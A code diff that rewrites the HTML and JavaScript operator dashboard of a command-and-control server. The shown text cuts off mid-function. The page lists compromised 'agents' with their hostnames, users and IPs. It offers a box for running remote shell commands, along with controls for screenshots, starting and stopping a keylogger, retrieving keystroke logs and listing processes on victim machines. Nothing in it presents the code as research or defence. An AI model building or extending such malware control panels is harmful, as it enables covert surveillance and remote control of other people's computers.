@@ -1,321 +1,1288 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Enhanced C2 Server</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 30px; }
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .stat-card { background: #007bff; color: white; padding: 20px; border-radius: 8px; text-align: center; }
-        .stat-number { font-size: 2em; font-weight: bold; }
-        .section { margin-bottom: 30px; }
-        .section h2 { border-bottom: 2px solid #007bff; padding-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
-        th { background-color: #f8f9fa; }
-        .btn { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
-        .btn:hover { background: #0056b3; }
-        .btn-danger { background: #dc3545; }
-        .btn-danger:hover { background: #c82333; }
-        .command-input { width: 70%; padding: 10px; margin-right: 10px; }
-        .log { background: #f8f9fa; padding: 15px; border-radius: 4px; max-height: 300px; overflow-y: auto; font-family: monospace; }
-        .status { padding: 10px; margin: 10px 0; border-radius: 4px; }
-        .status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Enhanced C2 Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #375bd0;
+      --primary-dark: #2a46a3;
+      --primary-light: #e6edff;
+      --success: #27d17a;
+      --warning: #ffb648;
+      --danger: #ff6b6b;
+      --bg1: #f8fafc;
+      --bg2: #eef4ff;
+      --card: #ffffff;
+      --text: #24303d;
+      --text-muted: #6b7280;
+      --border: #e6eefb;
+      --radius: 16px;
+      --glass-shadow: 0 10px 30px rgba(3, 10, 18, 0.08);
+      --transition: all 0.2s ease;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      background: linear-gradient(135deg, var(--bg1), var(--bg2));
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      min-height: 100vh;
+      padding: 10px;
+    }
+
+    .page {
+      max-width: 1320px;
+      margin: 0 auto;
+      padding: 28px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--glass-shadow);
+      backdrop-filter: blur(6px);
+    }
+
+    /* Header Styles */
+    .header {
+      display: flex;
+      gap: 20px;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 28px;
+      flex-wrap: wrap;
+    }
+
+    .branding {
+      display: flex;
+      gap: 18px;
+      align-items: center;
+    }
+
+    .logo {
+      width: 56px;
+      height: 56px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 700;
+      font-size: 20px;
+      box-shadow: 0 6px 18px rgba(54, 81, 210, 0.18);
+      flex-shrink: 0;
+    }
+
+    .title h1 {
+      margin: 0;
+      font-size: 24px;
+      letter-spacing: -0.2px;
+      color: var(--primary);
+      font-weight: 700;
+    }
+
+    .title p {
+      margin: 4px 0 0;
+      color: var(--text-muted);
+      font-size: 14px;
+    }
+
+    .env-indicator {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      padding: 8px 12px;
+      background: var(--primary-light);
+      border-radius: 8px;
+      font-size: 13px;
+      color: var(--primary-dark);
+      font-weight: 500;
+    }
+
+    /* Stats Grid */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 20px;
+      margin-bottom: 32px;
+    }
+
+    .stat-card {
+      padding: 20px;
+      border-radius: 14px;
+      background: linear-gradient(180deg, #fff, #fafcff);
+      box-shadow: 0 6px 16px rgba(33, 47, 84, 0.06);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      transition: var(--transition);
+    }
+
+    .stat-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(33, 47, 84, 0.1);
+    }
+
+    .stat-info {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .stat-label {
+      font-size: 14px;
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+
+    .stat-value {
+      font-weight: 700;
+      font-size: 22px;
+      color: var(--text);
+    }
+
+    .stat-badge {
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      color: white;
+    }
+
+    .stat-badge .stat-value {
+      color: white;
+    }
+
+    /* Section Styles */
+    .section {
+      margin-bottom: 28px;
+      padding: 24px;
+      background: white;
+      border-radius: 14px;
+      box-shadow: var(--glass-shadow);
+    }
+
+    .section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .section-title {
+      margin: 0;
+      color: var(--primary);
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .section-actions {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    /* Table Styles */
+    .table-container {
+      overflow: auto;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 800px;
+    }
+
+    thead th {
+      background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+      color: white;
+      text-align: left;
+      padding: 14px 16px;
+      font-weight: 600;
+      font-size: 14px;
+      position: sticky;
+      top: 0;
+    }
+
+    tbody td {
+      padding: 14px 16px;
+      border-bottom: 1px solid var(--border);
+      font-size: 14px;
+      color: var(--text);
+      vertical-align: middle;
+    }
+
+    tbody tr:last-child td {
+      border-bottom: none;
+    }
+
+    tbody tr:hover {
+      background: #fcfdff;
+    }
+
+    .status-active {
+      color: var(--success);
+      font-weight: 600;
+    }
+
+    .actions-cell {
+      display: flex;
+      gap: 8px;
+    }
+
+    /* Controls Layout */
+    .controls-container {
+      display: grid;
+      grid-template-columns: 1fr 420px;
+      gap: 24px;
+    }
+
+    .controls-section {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .agent-info {
+      background: var(--primary-light);
+      padding: 16px;
+      border-radius: 12px;
+      font-size: 14px;
+    }
+
+    .agent-info strong {
+      color: var(--primary-dark);
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    /* Buttons */
+    .btn {
+      border: none;
+      border-radius: 10px;
+      padding: 10px 16px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 14px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: var(--transition);
+      text-decoration: none;
+      line-height: 1;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(55, 91, 208, 0.2);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    .btn-primary {
+      background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+      color: white;
+      box-shadow: 0 8px 22px rgba(55, 91, 232, 0.12);
+    }
+
+    .btn-ghost {
+      background: transparent;
+      color: var(--primary);
+      box-shadow: none;
+      border: 1px solid var(--border);
+    }
+
+    .btn-ghost:hover {
+      background: var(--primary-light);
+    }
+
+    .btn-warning {
+      background: linear-gradient(90deg, var(--warning), #ff8f2b);
+      color: #122;
+      box-shadow: 0 8px 20px rgba(255, 139, 36, 0.12);
+    }
+
+    .btn-danger {
+      background: linear-gradient(90deg, var(--danger), #dc3545);
+      color: white;
+    }
+
+    .btn-small {
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-size: 13px;
+    }
+
+    .btn-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 12px;
+    }
+
+    /* Form Elements */
+    .form-row {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .form-control {
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      font-size: 14px;
+      background: white;
+      transition: var(--transition);
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(55, 91, 208, 0.2);
+    }
+
+    .form-select {
+      flex: 1;
+      min-width: 180px;
+    }
+
+    .form-input {
+      flex: 1;
+      min-width: 200px;
+    }
+
+    /* Terminal */
+    .terminal-container {
+      margin-top: 16px;
+      position: relative;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      
+    }
+
+    .terminal {
+      background: #0f1720;
+      color: #cfe8ff;
+      padding: 20px;
+      border-radius: 14px;
+      width: 100%;
+      max-width: 100%;
+      min-height: 200px;
+      max-height: 420px;
+      overflow: auto;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Courier New", monospace;
+      font-size: 14px;
+      box-shadow: 0 10px 30px rgba(3, 10, 18, 0.18);
+      position: relative;
+    }
+
+    .terminal-entry {
+      margin-bottom: 16px;
+      padding-left: 12px;
+      border-left: 3px solid rgba(255, 255, 255, 0.04);
+      opacity: 0;
+      transform: translateY(10px);
+      animation: fadeInUp 0.3s forwards;
+    }
+
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .terminal-meta {
+      color: #8fb3ff;
+      font-weight: 600;
+      margin-bottom: 8px;
+      font-size: 13px;
+    }
+
+    .terminal-output {
+      margin: 0;
+      white-space: pre-wrap;
+      color: #e6f3ff;
+      font-family: inherit;
+      font-size: 14px;
+    }
+
+    /* Status Messages */
+    .status-message {
+      padding: 12px 16px;
+      border-radius: 10px;
+      display: none;
+      margin-top: 12px;
+      font-weight: 600;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .status-ok {
+      background: #e6f7ea;
+      color: #0b6a2b;
+      display: block;
+    }
+
+    .status-error {
+      background: #fff0f2;
+      color: #7b1a1a;
+      display: block;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-5px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Loading Indicator */
+    .loading-indicator {
+      position: absolute;
+      bottom: 10px;
+      right: 15px;
+      display: none;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: var(--primary);
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.9); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    /* Helper Classes */
+    .text-muted {
+      color: var(--text-muted);
+      font-size: 14px;
+    }
+
+    .no-agents {
+      text-align: center;
+      color: var(--text-muted);
+      padding: 32px;
+      font-size: 16px;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 920px) {
+      .controls-container {
+        grid-template-columns: 1fr;
+      }
+      
+      .header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .form-row {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      
+      .btn-group {
+        justify-content: center;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .page {
+        padding: 20px;
+      }
+      
+      .section {
+        padding: 20px;
+      }
+      
+      .logo {
+        width: 48px;
+        height: 48px;
+        font-size: 18px;
+      }
+      
+      .title h1 {
+        font-size: 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>Enhanced C2 Server</h1>
-            <p>Command and Control Server Management Interface</p>
+  <div class="page" role="main">
+    <header class="header">
+      <div class="branding">
+        <div class="logo">C2</div>
+        <div class="title">
+          <h1>Enhanced C2 Dashboard</h1>
+          <p class="text-muted">Real-time Command and Control Server Management</p>
         </div>
-        
-        <div id="status" class="status" style="display: none;"></div>
-        
-        <div class="stats">
-            <div class="stat-card">
-                <div class="stat-number" id="agent-count">0</div>
-                <div>Active Agents</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="command-count">0</div>
-                <div>Commands Executed</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="success-rate">0%</div>
-                <div>Success Rate</div>
-            </div>
-        </div>
+      </div>
 
-        <div class="section">
-            <h2>Active Agents</h2>
-            <button class="btn" onclick="loadAgents()" style="background: #28a745;">Load Agents</button>
-            <table id="agents-table">
-                <thead>
-                    <tr>
-                        <th>Agent ID</th>
-                        <th>Hostname</th>
-                        <th>Username</th>
-                        <th>OS</th>
-                        <th>IP Address</th>
-                        <th>Last Seen</th>
-                        <th>Status</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody id="agents-tbody">
-                </tbody>
-            </table>
-        </div>
+      <div class="env-indicator">
+        <span>Production Mode</span>
+        <button id="refresh-status" class="btn btn-ghost btn-small">Refresh</button>
+      </div>
+    </header>
 
-        <div class="section">
-            <h2>Command Execution</h2>
-            <div>
-                <select id="agent-select" style="padding: 10px; margin-right: 10px;">
-                    <option value="">Select Agent</option>
-                </select>
-                <input type="text" id="command-input" class="command-input" placeholder="Enter command...">
-                <button class="btn" onclick="executeCommand()">Execute</button>
-                <button class="btn" onclick="refreshResults()" style="background: #28a745;">Refresh Results</button>
-            </div>
-            <div id="command-results" class="log" style="margin-top: 20px;"></div>
+    <!-- Live Stats -->
+    <div class="stats-grid" aria-label="System statistics">
+      <div class="stat-card">
+        <div class="stat-info">
+          <div class="stat-label">Active Agents</div>
+          <div class="stat-value" id="agent-count">0</div>
         </div>
+        <div class="text-muted" style="font-size:13px;">Agents connected</div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-info">
+          <div class="stat-label">Commands Executed</div>
+          <div class="stat-value" id="command-count">0</div>
+        </div>
+      </div>
+
+      <div class="stat-card stat-badge">
+        <div class="stat-info">
+          <div class="stat-label">Success Rate</div>
+          <div class="stat-value" id="success-rate">100%</div>
+        </div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-info">
+          <div class="stat-label">Active Capabilities</div>
+          <div class="stat-value" id="active-capabilities">0</div>
+        </div>
+      </div>
     </div>
 
-    <script>
-        function showStatus(message, type) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.className = 'status ' + type;
-            status.style.display = 'block';
-            setTimeout(() => {
-                status.style.display = 'none';
-            }, 3000);
-        }
+    <!-- Agents List -->
+    <section class="section">
+      <div class="section-header">
+        <h2 class="section-title">Active Agents</h2>
+        <div class="section-actions">
+          <button id="refresh-agents" class="btn btn-primary btn-small">Load / Refresh</button>
+          <span class="text-muted">Select an agent below</span>
+        </div>
+      </div>
 
-        function loadAgents() {
-            console.log('Loading agents...');
-            showStatus('Loading agents...', 'success');
-            
-            fetch('/api/agents')
-                .then(response => {
-                    console.log('Agents response status:', response.status);
-                    if (!response.ok) {
-                        throw new Error('HTTP ' + response.status);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Agents data received:', data);
-                    updateAgentsTable(data.agents);
-                    updateStats({
-                        agents: data.agents,
-                        command_count: 0,
-                        success_rate: '100%'
-                    });
-                    showStatus('Agents loaded successfully!', 'success');
-                })
-                .catch(error => {
-                    console.error('Error loading agents:', error);
-                    showStatus('Error loading agents: ' + error.message, 'error');
-                });
-        }
+      <div class="table-container">
+        <table aria-label="Agents table">
+          <thead>
+            <tr>
+              <th>Display Name</th>
+              <th>Agent ID</th>
+              <th>Hostname</th>
+              <th>User</th>
+              <th>OS</th>
+              <th>IP</th>
+              <th>Capabilities</th>
+              <th>Last Seen</th>
+              <th>Status</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="agents-tbody">
+            <tr>
+              <td colspan="10" class="no-agents">No agents connected</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
 
-        function updateAgentsTable(agents) {
-            console.log('Updating agents table with:', agents);
-            const tbody = document.getElementById('agents-tbody');
-            const select = document.getElementById('agent-select');
-            
-            if (!tbody || !select) {
-                console.error('Could not find agents table or select element');
-                return;
-            }
-            
-            tbody.innerHTML = '';
-            select.innerHTML = '<option value="">Select Agent</option>';
-            
-            const agentValues = Object.values(agents);
-            console.log('Processing', agentValues.length, 'agents');
-            
-            if (agentValues.length === 0) {
-                const row = tbody.insertRow();
-                row.innerHTML = '<td colspan="8" style="text-align: center; color: #666;">No agents connected</td>';
-                return;
-            }
-            
-            agentValues.forEach(agent => {
-                console.log('Adding agent:', agent.agent_id);
-                const row = tbody.insertRow();
-                row.innerHTML = `
-                    <td>${agent.agent_id}</td>
-                    <td>${agent.hostname}</td>
-                    <td>${agent.username}</td>
-                    <td>${agent.os_info}</td>
-                    <td>${agent.ip_address}</td>
-                    <td>${new Date(agent.last_seen).toLocaleString()}</td>
-                    <td><span style="color: green;">Online</span></td>
-                    <td>
-                        <button class="btn btn-danger" onclick="removeAgent('${agent.agent_id}')">Remove</button>
-                    </td>
-                `;
-                
-                const option = document.createElement('option');
-                option.value = agent.agent_id;
-                option.textContent = agent.agent_id;
-                select.appendChild(option);
-            });
-            
-            console.log('Agents table updated successfully');
-        }
+    <!-- Controls and Command Area -->
+    <section class="section">
+      <div class="controls-container">
+        <div class="controls-section">
+          <h2 class="section-title">Enhanced Agent Controls</h2>
+          <div id="agent-capabilities-info" class="agent-info">
+            <strong>No agent selected</strong>
+          </div>
 
-        function updateStats(data) {
-            const agentCount = Object.keys(data.agents || {}).length;
-            document.getElementById('agent-count').textContent = agentCount;
-            document.getElementById('command-count').textContent = data.command_count || 0;
-            document.getElementById('success-rate').textContent = data.success_rate || '0%';
-        }
+          <div class="btn-group">
+            <button id="screenshot-btn" class="btn btn-ghost btn-small" disabled>📸 Screenshot</button>
+            <button id="start-keylogger-btn" class="btn btn-primary btn-small" disabled>🔐 Start Keylogger</button>
+            <button id="stop-keylogger-btn" class="btn btn-warning btn-small" disabled>🔒 Stop Keylogger</button>
+            <button id="get-keylog-btn" class="btn btn-ghost btn-small" disabled>📋 Get Keylog Data</button>
+            <button id="get-info-btn" class="btn btn-ghost btn-small" disabled>ℹ️ Agent Info</button>
+            <button id="get-processes-btn" class="btn btn-ghost btn-small" disabled>⚙️ Processes</button>
+          </div>
 
-        function executeCommand() {
-            const agentId = document.getElementById('agent-select').value;
-            const command = document.getElementById('command-input').value;
-            
-            if (!agentId || !command) {
-                alert('Please select an agent and enter a command');
-                return;
-            }
-            
-            fetch('/api/commands/execute', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    agent_id: agentId,
-                    command: command,
-                    command_type: 'shell'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Command executed:', data);
-                showStatus('Command executed successfully! Waiting for results...', 'success');
-                
-                // Start polling for results
-                pollCommandResults(agentId);
-            })
-            .catch(error => {
-                console.error('Command execution error:', error);
-                showStatus('Command execution failed: ' + error.message, 'error');
-            });
-            
-            document.getElementById('command-input').value = '';
-        }
+          <div class="text-muted">Real-time controls connected to active agents</div>
+        </div>
 
-        function pollCommandResults(agentId) {
-            console.log('Polling for command results...');
-            
-            fetch(`/api/commands/${agentId}/results`)
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Command results:', data);
-                    displayCommandResults(data.results);
-                })
-                .catch(error => {
-                    console.error('Error fetching command results:', error);
-                });
-        }
+        <div class="controls-section">
+          <h2 class="section-title">Command Execution</h2>
 
-        function displayCommandResults(results) {
-            const log = document.getElementById('command-results');
-            
-            if (results.length === 0) {
-                log.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">No command results yet. Commands may take a few seconds to execute.</div>';
-                return;
-            }
-            
-            log.innerHTML = '';
-            
-            results.forEach(result => {
-                const timestamp = new Date(result.timestamp).toLocaleString();
-                const formattedResult = result.result
-                    .replace(/\n/g, '<br>')
-                    .replace(/\t/g, '&nbsp;&nbsp;&nbsp;&nbsp;')
-                    .replace(/ /g, '&nbsp;');
-                
-                const resultDiv = document.createElement('div');
-                resultDiv.style.cssText = 'margin-bottom: 15px; border-left: 3px solid #007bff; padding-left: 10px;';
-                
-                resultDiv.innerHTML = `
-                    <div style="font-weight: bold; color: #007bff; margin-bottom: 5px;">
-                        [${timestamp}] Agent: ${result.agent_id} - ${result.success ? 'SUCCESS' : 'FAILED'}
-                    </div>
-                    <div style="background: #ffffff; padding: 10px; border-radius: 4px; border: 1px solid #dee2e6; white-space: pre-wrap; font-family: monospace; font-size: 13px; line-height: 1.4;">
-                        ${formattedResult}
-                    </div>
-                `;
-                
-                log.appendChild(resultDiv);
-            });
-            
-            log.scrollTop = log.scrollHeight;
-        }
+          <div class="form-row">
+            <select id="agent-select" class="form-control form-select">
+              <option value="">Select Agent</option>
+            </select>
+            <input id="command-input" class="form-control form-input" type="text" placeholder="Enter command to execute..." />
+            <button id="execute-btn" class="btn btn-primary btn-small">Execute</button>
+          </div>
 
-        function removeAgent(agentId) {
-            if (confirm('Are you sure you want to remove this agent?')) {
-                fetch(`/api/agents/${agentId}`, { method: 'DELETE' })
-                    .then(() => {
-                        showStatus('Agent removed successfully!', 'success');
-                        loadAgents(); // Reload the list
-                    })
-                    .catch(error => {
-                        console.error('Error removing agent:', error);
-                        showStatus('Error removing agent: ' + error.message, 'error');
-                    });
-            }
-        }
+          
+        </div>
+      </div>
+    </section>
+    <div class="form-row">
+        <button id="refresh-results" class="btn btn-ghost btn-small">Refresh Results</button>
+        <button id="clear-results" class="btn btn-ghost btn-small">Clear Results</button>
+        <div id="status-box" class="status-message"></div>
+      </div>
 
-        function refreshResults() {
-            const agentSelect = document.getElementById('agent-select');
-            if (agentSelect.value) {
-                console.log('Refreshing command results...');
-                pollCommandResults(agentSelect.value);
-                showStatus('Command results refreshed!', 'success');
-            } else {
-                showStatus('Please select an agent first', 'error');
-            }
-        }
+      <div class="terminal-container">
+        <div id="command-results" class="terminal" aria-live="polite">
+          <div class="text-muted">No output yet. Execute a command.</div>
+        </div>
+        <div id="loading-indicator" class="loading-indicator"></div>
+      </div>
+  </div>
 
-        // Auto-refresh command results every 3 seconds
-        function startAutoRefresh() {
-            setInterval(() => {
-                const agentSelect = document.getElementById('agent-select');
-                if (agentSelect.value) {
-                    pollCommandResults(agentSelect.value);
-                }
-            }, 3000);
-        }
+  <script>
+    // DOM references
+    const refs = {
+      agentsTbody: document.getElementById('agents-tbody'),
+      agentSelect: document.getElementById('agent-select'),
+      agentCount: document.getElementById('agent-count'),
+      cmdCount: document.getElementById('command-count'),
+      successRate: document.getElementById('success-rate'),
+      activeCaps: document.getElementById('active-capabilities'),
+      agentCapabilitiesInfo: document.getElementById('agent-capabilities-info'),
+      commandResultsBox: document.getElementById('command-results'),
+      statusBox: document.getElementById('status-box'),
+      executeBtn: document.getElementById('execute-btn'),
+      commandInput: document.getElementById('command-input'),
+      screenshotBtn: document.getElementById('screenshot-btn'),
+      startKeyloggerBtn: document.getElementById('start-keylogger-btn'),
+      stopKeyloggerBtn: document.getElementById('stop-keylogger-btn'),
+      getKeylogBtn: document.getElementById('get-keylog-btn'),
+      getInfoBtn: document.getElementById('get-info-btn'),
+      getProcessesBtn: document.getElementById('get-processes-btn'),
+      refreshAgentsBtn: document.getElementById('refresh-agents'),
+      refreshResultsBtn: document.getElementById('refresh-results'),
+      clearResultsBtn: document.getElementById('clear-results'),
+      refreshStatusBtn: document.getElementById('refresh-status'),
+      loadingIndicator: document.getElementById('loading-indicator')
+    };
 
-        // Handle agent selection change
-        function onAgentChange() {
-            const agentSelect = document.getElementById('agent-select');
-            if (agentSelect.value) {
-                console.log('Agent selected:', agentSelect.value);
-                pollCommandResults(agentSelect.value);
-            } else {
-                document.getElementById('command-results').innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">Select an agent to see command results</div>';
-            }
-        }
+    // Global state
+    let agents = {};
+    let commandResults = {};
+    let commandCounter = 0;
+    let lastCommandId = 0;
+    let websocket = null;
+    let currentAgentId = null;
+    let isUpdating = false;
 
-        // Load agents when page loads
-        window.addEventListener('load', function() {
-            console.log('Page loaded, loading agents...');
-            loadAgents();
-            startAutoRefresh();
-            
-            // Add event listener for agent selection
-            const agentSelect = document.getElementById('agent-select');
-            agentSelect.addEventListener('change', onAgentChange);
+    // Utility: safe HTML escape
+    function escapeHtml(s){
+      if (s == null) return '';
+      return String(s)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '<')
+        .replace(/>/g, '>');
+    }
+
+    // Show status message
+    function showStatus(text, kind){
+      refs.statusBox.textContent = text;
+      refs.statusBox.className = 'status-message ' + (kind === 'ok' ? 'status-ok' : 'status-error');
+      setTimeout(()=> {
+        refs.statusBox.className = 'status-message';
+      }, 5000);
+    }
+
+    // Show/hide loading indicator
+    function showLoading(show) {
+      if (show) {
+        refs.loadingIndicator.style.display = 'block';
+      } else {
+        refs.loadingIndicator.style.display = 'none';
+      }
+    }
+
+    // Fetch agents from server
+    async function loadAgents(){
+      try {
+        showStatus('Loading agents...', 'ok');
+        const response = await fetch('/api/agents');
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const data = await response.json();
+        agents = data.agents;
+        updateAgentsTable();
+        updateStats();
+        populateAgentSelect();
+        setButtonStates(refs.agentSelect.value);
+        showStatus('Agents loaded successfully', 'ok');
+      } catch (error) {
+        console.error('Error loading agents:', error);
+        showStatus(`Error loading agents: ${error.message}`, 'err');
+      }
+    }
+
+    // Update stats display
+    function updateStats(){
+      const agentCount = Object.keys(agents).length;
+      refs.agentCount.textContent = agentCount;
+      
+      // Compute active capabilities
+      let caps = 0;
+      for (const id in agents) {
+        const a = agents[id];
+        if (a.capabilities) caps += Object.values(a.capabilities).filter(v => v).length;
+      }
+      refs.activeCaps.textContent = caps;
+      
+      // Calculate success rate (placeholder - needs actual command tracking)
+      refs.successRate.textContent = "100%";
+    }
+
+    // Populate agent select dropdown
+    function populateAgentSelect(){
+      const sel = refs.agentSelect;
+      const currentSelection = sel.value;
+      sel.innerHTML = '<option value="">Select Agent</option>';
+      for (const [id, a] of Object.entries(agents)){
+        const opt = document.createElement('option');
+        opt.value = id;
+        opt.textContent = a.display_name || a.agent_id;
+        sel.appendChild(opt);
+      }
+      // Restore selection if possible
+      sel.value = currentSelection;
+    }
+
+    // Build agents table
+    function updateAgentsTable(){
+      refs.agentsTbody.innerHTML = '';
+      if (Object.keys(agents).length === 0){
+        refs.agentsTbody.innerHTML = '<tr><td colspan="10" class="no-agents">No agents connected</td></tr>';
+        return;
+      }
+      for (const [id, a] of Object.entries(agents)){
+        const tr = document.createElement('tr');
+        const caps = Object.keys(a.capabilities || {}).filter(k => a.capabilities[k]).join(', ') || 'None';
+        tr.innerHTML = `
+          <td>${escapeHtml(a.display_name || a.agent_id)}</td>
+          <td>${escapeHtml(a.agent_id)}</td>
+          <td>${escapeHtml(a.hostname)}</td>
+          <td>${escapeHtml(a.username)}</td>
+          <td>${escapeHtml(a.os_info)}</td>
+          <td>${escapeHtml(a.ip_address)}</td>
+          <td>${escapeHtml(caps)}</td>
+          <td>${new Date(a.last_seen).toLocaleString()}</td>
+          <td class="status-active">${escapeHtml(a.status)}</td>
+          <td class="actions-cell">
+            <button class="btn btn-ghost btn-small" data-action="select" data-id="${escapeHtml(id)}">Select</button>
+            <button class="btn btn-danger btn-small" data-action="remove" data-id="${escapeHtml(id)}">Remove</button>
+          </td>
+        `;
+        refs.agentsTbody.appendChild(tr);
+      }
+      // attach delegated click handlers for select/remove
+      refs.agentsTbody.querySelectorAll('button[data-action]').forEach(btn => {
+        btn.onclick = (ev) => {
+          const action = btn.getAttribute('data-action');
+          const aid = btn.getAttribute('data-id');
+          if (action === 'select'){
+            refs.agentSelect.value = aid;
+            onAgentChange();
+          } else if (action === 'remove'){
+            removeAgent(aid);
+          }
+        };
+      });
+    }
+
+    // Set button states based on selected agent capabilities
+    function setButtonStates(agentId){
+      const enable = !!agentId && agents[agentId];
+      // default disable all
+      for (const b of [refs.screenshotBtn, refs.startKeyloggerBtn, refs.stopKeyloggerBtn, refs.getKeylogBtn, refs.getInfoBtn, refs.getProcessesBtn]){
+        b.disabled = !enable;
+      }
+      if (!enable) {
+        refs.agentCapabilitiesInfo.innerHTML = '<strong>No agent selected</strong>';
+        return;
+      }
+      const capabilities = agents[agentId].capabilities || {};
+      refs.screenshotBtn.disabled = !capabilities.screenshot;
+      refs.startKeyloggerBtn.disabled = !capabilities.keylogger;
+      refs.stopKeyloggerBtn.disabled = !capabilities.keylogger;
+      refs.getKeylogBtn.disabled = !capabilities.keylogger;
+      refs.getProcessesBtn.disabled = !capabilities.processes;
+      refs.getInfoBtn.disabled = false; // Info always available
+
+      // Update capability info display
+      const capsList = Object.keys(capabilities).filter(k => capabilities[k]).join(', ') || 'None';
+      refs.agentCapabilitiesInfo.innerHTML = `<strong>${escapeHtml(agents[agentId].display_name || agents[agentId].agent_id)}</strong><div class="text-muted">Capabilities: ${escapeHtml(capsList)}</div><div class="text-muted">IP: ${escapeHtml(agents[agentId].ip_address)} — Last seen: ${new Date(agents[agentId].last_seen).toLocaleString()}</div>`;
+    }
+
+    // Event: agent select changed
+    function onAgentChange(){
+      const id = refs.agentSelect.value;
+      currentAgentId = id;
+      setButtonStates(id);
